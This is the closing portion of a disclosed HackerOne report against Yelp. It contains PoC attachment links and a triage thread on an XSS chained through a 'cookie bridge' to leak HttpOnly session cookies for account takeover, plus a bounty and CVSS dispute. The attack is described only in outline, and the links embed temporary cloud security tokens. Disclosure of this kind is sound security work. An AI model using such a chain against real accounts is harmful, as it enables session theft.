JqIwtl13TNv6FmQBt70wC7DdQrZb9%2B0KEHF4Q4Z1xZyw1nNulaM1K4Q9KYE61KvY91WPouzUWn5DEvBk2BLy8xu3QalpO6k70zRiaw9FTHSTJmt5HT%2FrQk5v8YajH5WiCAkIXsc3lCyf5l8RBNgKVh3XoXm%2Fopo2Wj3cE%2BfqqttQA%2BTBLsITxsvZQMR5GtFX6PAX7CCQaRDVP0vphAjky0q5zfAQaFS1rogk4r9Uom%2BJY9noefNoT8T7nu1kiO8WA9LmNrZmrMS2uJ%2F%2Fb3affiQRk2TxGREaXzbrPyHZdKKffDHw5qEUnwc1o%2Fze2LH58EYANSBglcYm7nfPg0cvjbG%2F%2BaAbuJsQFP7BOx6IGtsTWbIhQ9Hzt3p5j46wpoXT4Rg8acJN9EGIomRJ3oslndkP2XX8M1sxFeKI8Bz2%2BfPKmDu0eN%2BXDvmD%2FhPOUB7D2yQo%2BC2Mqp9zocBKNAe1reaC3nf%2BILW%2BhFvEHzwjiD3Y7raiUw9pwRreAUkDQ0u%2BpItM0OGoV7ge7cQsYVyQeAQccfpglsv%2FkbVhdTYD0pu%2F5aNh2Z01L9oUewkf0%2BRBObI4jIW97HajMiUoscXYIUa7sxkp8di92eZTm4U6wxMNjMoE6rX9C90jG5Ijru2VVvi917jiji%2Br%2FhFtMfzu6tz2dGOBeljsC1oMV3Xtl2pBVSLDOP4SN8uR0EsIlZM%2FZCD58DCCt9%2FTBjqyAYsv69Pv%2FtK3v6AqhUydIyQLOD8S9rwMe7VX4dq6XjtqwYMlei5KYphJezMcrBZITyFP5v%2BcG8ZHOUocuIWkSyDUKG5%2FJz9AA%2F%2BJwW%2FxyK2aPAhCqkgB%2FQhXfQYNd4pMCf9%2B1y4Na17NOrD4oI9DrfPKLUqoISxX%2FxQR8Y6E9UBhmBUj9YNPLZfZ81Cl06P%2FFrUj%2FRCB57o2hE0XZdmBcGGsKrfYdyTGqPOVWYWpgsGSXXQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8a65600e57fc1f3c9609624735f715ad02a18c5a0b3e05b6e78356c75b9700c4)

-

F2544131: [2023-07-28-170955_1204x418_scrot.png](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tgc0w9nyg0riynvekg11j1r9l7db?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-170955_1204x418_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-170955_1204x418_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=REDACTED_AWS_ACCESS_KEY_ID%2F20260809%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260809T021354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICIW9EFiCLAk%2FkixA1LKiTXYfYpj55mJBYPlsIecaF1SAiBtM117mc2k0c9z5TzMRELxkaFMxnnAF9uBpRVMQ4LSfSqyBQh7EAMaDDAxMzYxOTI3NDg0OSIMsTCry8mhZ0YuE9RqKo8F0hSO8Qvb682mtFHEVN1CqALFEk%2FWGMkq1jnrN2HkOowqSeOJLzP9iCA3HMJJzTn3Iu52OpH9ma3rH9z33F4Sh4tpcPeiJc8489f16k4BU5saX9Rmj1qKm3LomjZAYcuxktb2WUEosRQLImwoVidQAvZVyIANzTViCBTEJqIwtl13TNv6FmQBt70wC7DdQrZb9%2B0KEHF4Q4Z1xZyw1nNulaM1K4Q9KYE61KvY91WPouzUWn5DEvBk2BLy8xu3QalpO6k70zRiaw9FTHSTJmt5HT%2FrQk5v8YajH5WiCAkIXsc3lCyf5l8RBNgKVh3XoXm%2Fopo2Wj3cE%2BfqqttQA%2BTBLsITxsvZQMR5GtFX6PAX7CCQaRDVP0vphAjky0q5zfAQaFS1rogk4r9Uom%2BJY9noefNoT8T7nu1kiO8WA9LmNrZmrMS2uJ%2F%2Fb3affiQRk2TxGREaXzbrPyHZdKKffDHw5qEUnwc1o%2Fze2LH58EYANSBglcYm7nfPg0cvjbG%2F%2BaAbuJsQFP7BOx6IGtsTWbIhQ9Hzt3p5j46wpoXT4Rg8acJN9EGIomRJ3oslndkP2XX8M1sxFeKI8Bz2%2BfPKmDu0eN%2BXDvmD%2FhPOUB7D2yQo%2BC2Mqp9zocBKNAe1reaC3nf%2BILW%2BhFvEHzwjiD3Y7raiUw9pwRreAUkDQ0u%2BpItM0OGoV7ge7cQsYVyQeAQccfpglsv%2FkbVhdTYD0pu%2F5aNh2Z01L9oUewkf0%2BRBObI4jIW97HajMiUoscXYIUa7sxkp8di92eZTm4U6wxMNjMoE6rX9C90jG5Ijru2VVvi917jiji%2Br%2FhFtMfzu6tz2dGOBeljsC1oMV3Xtl2pBVSLDOP4SN8uR0EsIlZM%2FZCD58DCCt9%2FTBjqyAYsv69Pv%2FtK3v6AqhUydIyQLOD8S9rwMe7VX4dq6XjtqwYMlei5KYphJezMcrBZITyFP5v%2BcG8ZHOUocuIWkSyDUKG5%2FJz9AA%2F%2BJwW%2FxyK2aPAhCqkgB%2FQhXfQYNd4pMCf9%2B1y4Na17NOrD4oI9DrfPKLUqoISxX%2FxQR8Y6E9UBhmBUj9YNPLZfZ81Cl06P%2FFrUj%2FRCB57o2hE0XZdmBcGGsKrfYdyTGqPOVWYWpgsGSXXQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1a3bce309302cf1a7e1dc8c7081d432e3a23ef157d42b1e2dad307e930af2354)

-

F2544134: [2023-07-28-172439_1624x1193_scrot.png](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xbuaor61ug553x6fi9xj60yrx2uf?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-172439_1624x1193_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-172439_1624x1193_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=REDACTED_AWS_ACCESS_KEY_ID%2F20260809%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260809T021354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICIW9EFiCLAk%2FkixA1LKiTXYfYpj55mJBYPlsIecaF1SAiBtM117mc2k0c9z5TzMRELxkaFMxnnAF9uBpRVMQ4LSfSqyBQh7EAMaDDAxMzYxOTI3NDg0OSIMsTCry8mhZ0YuE9RqKo8F0hSO8Qvb682mtFHEVN1CqALFEk%2FWGMkq1jnrN2HkOowqSeOJLzP9iCA3HMJJzTn3Iu52OpH9ma3rH9z33F4Sh4tpcPeiJc8489f16k4BU5saX9Rmj1qKm3LomjZAYcuxktb2WUEosRQLImwoVidQAvZVyIANzTViCBTEJqIwtl13TNv6FmQBt70wC7DdQrZb9%2B0KEHF4Q4Z1xZyw1nNulaM1K4Q9KYE61KvY91WPouzUWn5DEvBk2BLy8xu3QalpO6k70zRiaw9FTHSTJmt5HT%2FrQk5v8YajH5WiCAkIXsc3lCyf5l8RBNgKVh3XoXm%2Fopo2Wj3cE%2BfqqttQA%2BTBLsITxsvZQMR5GtFX6PAX7CCQaRDVP0vphAjky0q5zfAQaFS1rogk4r9Uom%2BJY9noefNoT8T7nu1kiO8WA9LmNrZmrMS2uJ%2F%2Fb3affiQRk2TxGREaXzbrPyHZdKKffDHw5qEUnwc1o%2Fze2LH58EYANSBglcYm7nfPg0cvjbG%2F%2BaAbuJsQFP7BOx6IGtsTWbIhQ9Hzt3p5j46wpoXT4Rg8acJN9EGIomRJ3oslndkP2XX8M1sxFeKI8Bz2%2BfPKmDu0eN%2BXDvmD%2FhPOUB7D2yQo%2BC2Mqp9zocBKNAe1reaC3nf%2BILW%2BhFvEHzwjiD3Y7raiUw9pwRreAUkDQ0u%2BpItM0OGoV7ge7cQsYVyQeAQccfpglsv%2FkbVhdTYD0pu%2F5aNh2Z01L9oUewkf0%2BRBObI4jIW97HajMiUoscXYIUa7sxkp8di92eZTm4U6wxMNjMoE6rX9C90jG5Ijru2VVvi917jiji%2Br%2FhFtMfzu6tz2dGOBeljsC1oMV3Xtl2pBVSLDOP4SN8uR0EsIlZM%2FZCD58DCCt9%2FTBjqyAYsv69Pv%2FtK3v6AqhUydIyQLOD8S9rwMe7VX4dq6XjtqwYMlei5KYphJezMcrBZITyFP5v%2BcG8ZHOUocuIWkSyDUKG5%2FJz9AA%2F%2BJwW%2FxyK2aPAhCqkgB%2FQhXfQYNd4pMCf9%2B1y4Na17NOrD4oI9DrfPKLUqoISxX%2FxQR8Y6E9UBhmBUj9YNPLZfZ81Cl06P%2FFrUj%2FRCB57o2hE0XZdmBcGGsKrfYdyTGqPOVWYWpgsGSXXQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b0a5103595b1b809996333611ecd6ee44798dc64d4f9929125411d670738a78a)

-

F2544137: [biz.yelp-yelp-ato-poc.mp4](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/slks6bnc8pn2qbylk7cm80h9byz6?response-content-disposition=attachment%3B%20filename%3D%22biz.yelp-yelp-ato-poc.mp4%22%3B%20filename%2A%3DUTF-8%27%27biz.yelp-yelp-ato-poc.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=REDACTED_AWS_ACCESS_KEY_ID%2F20260809%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260809T021354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICIW9EFiCLAk%2FkixA1LKiTXYfYpj55mJBYPlsIecaF1SAiBtM117mc2k0c9z5TzMRELxkaFMxnnAF9uBpRVMQ4LSfSqyBQh7EAMaDDAxMzYxOTI3NDg0OSIMsTCry8mhZ0YuE9RqKo8F0hSO8Qvb682mtFHEVN1CqALFEk%2FWGMkq1jnrN2HkOowqSeOJLzP9iCA3HMJJzTn3Iu52OpH9ma3rH9z33F4Sh4tpcPeiJc8489f16k4BU5saX9Rmj1qKm3LomjZAYcuxktb2WUEosRQLImwoVidQAvZVyIANzTViCBTEJqIwtl13TNv6FmQBt70wC7DdQrZb9%2B0KEHF4Q4Z1xZyw1nNulaM1K4Q9KYE61KvY91WPouzUWn5DEvBk2BLy8xu3QalpO6k70zRiaw9FTHSTJmt5HT%2FrQk5v8YajH5WiCAkIXsc3lCyf5l8RBNgKVh3XoXm%2Fopo2Wj3cE%2BfqqttQA%2BTBLsITxsvZQMR5GtFX6PAX7CCQaRDVP0vphAjky0q5zfAQaFS1rogk4r9Uom%2BJY9noefNoT8T7nu1kiO8WA9LmNrZmrMS2uJ%2F%2Fb3affiQRk2TxGREaXzbrPyHZdKKffDHw5qEUnwc1o%2Fze2LH58EYANSBglcYm7nfPg0cvjbG%2F%2BaAbuJsQFP7BOx6IGtsTWbIhQ9Hzt3p5j46wpoXT4Rg8acJN9EGIomRJ3oslndkP2XX8M1sxFeKI8Bz2%2BfPKmDu0eN%2BXDvmD%2FhPOUB7D2yQo%2BC2Mqp9zocBKNAe1reaC3nf%2BILW%2BhFvEHzwjiD3Y7raiUw9pwRreAUkDQ0u%2BpItM0OGoV7ge7cQsYVyQeAQccfpglsv%2FkbVhdTYD0pu%2F5aNh2Z01L9oUewkf0%2BRBObI4jIW97HajMiUoscXYIUa7sxkp8di92eZTm4U6wxMNjMoE6rX9C90jG5Ijru2VVvi917jiji%2Br%2FhFtMfzu6tz2dGOBeljsC1oMV3Xtl2pBVSLDOP4SN8uR0EsIlZM%2FZCD58DCCt9%2FTBjqyAYsv69Pv%2FtK3v6AqhUydIyQLOD8S9rwMe7VX4dq6XjtqwYMlei5KYphJezMcrBZITyFP5v%2BcG8ZHOUocuIWkSyDUKG5%2FJz9AA%2F%2BJwW%2FxyK2aPAhCqkgB%2FQhXfQYNd4pMCf9%2B1y4Na17NOrD4oI9DrfPKLUqoISxX%2FxQR8Y6E9UBhmBUj9YNPLZfZ81Cl06P%2FFrUj%2FRCB57o2hE0XZdmBcGGsKrfYdyTGqPOVWYWpgsGSXXQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=578460fe9dffda201b288bfca213313b0eaf7627c9862275027fcdff35e4594c)

[![](https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542)](https://hackerone.com/yelp)

 Bot:

.

July 28, 2023, 11:12pm UTC

Hi there!

Thanks for submitting your report to us! Please expect a response within a week.

Best, The Yelp Security Team

[![Calvin Li](https://hackerone.com/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png)](https://hackerone.com/calvinli)

[calvinli](https://hackerone.com/calvinli)

 Yelp staff

changed the status to ****Triaged**.

July 29, 2023, 1:15am UTC

Hi [@lil_endian](https://hackerone.com/lil_endian),

Thanks for the detailed report once again. We've deployed a patch for the XSS described in the beginning of your report, and we'll have more on the rest of it next week,

Thanks, Yelp Security

[![Calvin Li](https://hackerone.com/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png)](https://hackerone.com/calvinli)

[calvinli](https://hackerone.com/calvinli)

 Yelp staff

closed the report and changed the status to ****Resolved**.

August 10, 2023, 8:14pm UTC

Hi [@lil_endian](https://hackerone.com/lil_endian),

We've pushed additional patches that increase the security of the cookie bridge, and now consider this report resolved.

Best, Yelp Security

[Yelp](https://hackerone.com/yelp)

rewarded [lil_endian](https://hackerone.com/lil_endian) with a bounty.

August 10, 2023, 8:14pm UTC

[calvinli](https://hackerone.com/calvinli)

 Yelp staff

requested to disclose this report.

August 10, 2023, 8:15pm UTC

[![](https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f)](https://hackerone.com/lil_endian)

[lil_endian](https://hackerone.com/lil_endian)

.

August 11, 2023, 12:50am UTC

Thanks for the bounty!

$3000 implies this report has been rewarded as a mid-range medium severity. After finding the initial XSS I put a lot of time and effort into coming up with a way to leak the victims `HttpOnly` session cookies to bump the impact and severity to High, so I'm a little disappointed if my efforts were wasted. I'm curious why you would only consider this a medium and not a high. Do you disagree with the CVSS score?

I intend to spend more time hacking on Yelp, so understanding how you rate bugs is really helpful.

[![](https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f)](https://hackerone.com/lil_endian)

[lil_endian](https://hackerone.com/lil_endian)

.

August 17, 2023, 3:06pm UTC

[@calvinli](https://hackerone.com/calvinli) bumping just in case you missed my question above :)

[![](https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f)](https://hackerone.com/lil_endian)

[lil_endian](https://hackerone.com/lil_endian)

.

August 23, 2023, 7:12am UTC

[@calvinli](https://hackerone.com/calvinli) bump again

[![](https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f)](https://hackerone.com/lil_endian)

[lil_endian](https://hackerone.com/lil_endian)

.

August 28, 2023, 12:44pm UTC

I'd really appreciate an answer here...

[yelp-619654bd](https://hackerone.com/yelp-619654bd)

updated the severity from

high (8.8)

 to medium.

August 28, 2023, 12:50pm UTC

[![Security Yelper](https://hackerone.com/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png)](https://hackerone.com/yelp-619654bd)

[yelp-619654bd](https://hackerone.com/yelp-619654bd)

.

August 28, 2023, 12:57pm UTC

Hello [@lil_endian](https://hackerone.com/lil_endian),

Our internal assessment of this report gave a CVSS score of 6.4 and the bounty paid was based on that. We stand by our decision to award $3000 and won't be increasing it at this time. That being said, we appreciate your quality report and look forward to read about anything else you may find.

Best, The Yelp Security Team

[![](https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f)](https://hackerone.com/lil_endian)

[lil_endian](https://hackerone.com/lil_endian)

.

August 28, 2023, 1:17pm UTC

Can you please share the CVSS score metrics you used to rate this issue then?

You made 2 changes based on this report (fixed the XSS issue, and made changes to the cookie bridge) so I'm a little disappointed if you've rated this as a plain old XSS issue.

[![Security Yelper](https://hackerone.com/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png)](https://hackerone.com/yelp-619654bd)

[yelp-619654bd](https://hackerone.com/yelp-619654bd)

.

August 29, 2023, 7:28am UTC

Hello [@lil_endian](https://hackerone.com/lil_endian),

This is the CVSS v3.1 Vector we used to calculate the score `AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N`.

I should also clarify that our bounty amounts does not depend only on the CVSS score, but on other factors too. In this case, we took into consideration the likelihood of this vulnerability being exploited, hence why we awarded $3000.

Please keep banging away on the Yelps. We'd love to see what else you find.

Best, The Yelp Security Team

[![](https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f)](https://hackerone.com/lil_endian)

[lil_endian](https://hackerone.com/lil_endian)

.

August 29, 2023, 8:12am UTC

Setting "Privileges Required" to "Low" makes no sense when an attacker can immediately bootstrap themselves from having no account to creating a free business account in less than a minute.

I don't really agree with the attack complexity being "High" either. There's no "conditions beyond the attacker's control" besides the user interaction which is captured by the "User Interaction" being set to "required". In my poc I manually created the cookie bridge link, because it's a proof of concept. A small script would be able to create the link, and the attack would be 100% deterministic, and require no manual work from the attacker.

I get that you're not going to change your mind, so I'll stop arguing.

But one final thing I want to mention. You said:

>

I should also clarify that our bounty amounts does not depend only on the CVSS score, but on other factors too. In this case, we took into consideration the likelihood of this vulnerability being exploited

I really think you should put this disclaimer in the program description. If the severity will be lowered because it's deemed unlikely that an attacker will put in the effort to find it / exploit it, people should know that before spending time looking for complex issues and chains.

Anyway, I'll get back to hacking on Yelp now.

[lil_endian](https://hackerone.com/lil_endian)

agreed to disclose this report.

September 8, 2023, 7:22am UTC

This report has been disclosed.

September 8, 2023, 7:22am UTC

## Recovery notes

Source evidence recovered on 2026-09-14. The earlier source capture (SHA-256 `66235b0c3b9caf341d4f3ddfbb81d31dbaf30150180bc93f58bde17ef83bde51`) is no longer available. This publication uses a separately preserved capture of the same document recorded on 2026-09-14 (SHA-256 `fcdefe0f55751f2627ad2ff94ebbcf2200fd8fdfa3c0d38eb1a7762413f7ec54`). The complete exposed report and discussion were checked against this capture. Code examples now retain their source line breaks and characters in fenced blocks, and missing section headings were restored where present. The existing technique summary remains applicable. The missing earlier capture remains documented in the archive history.
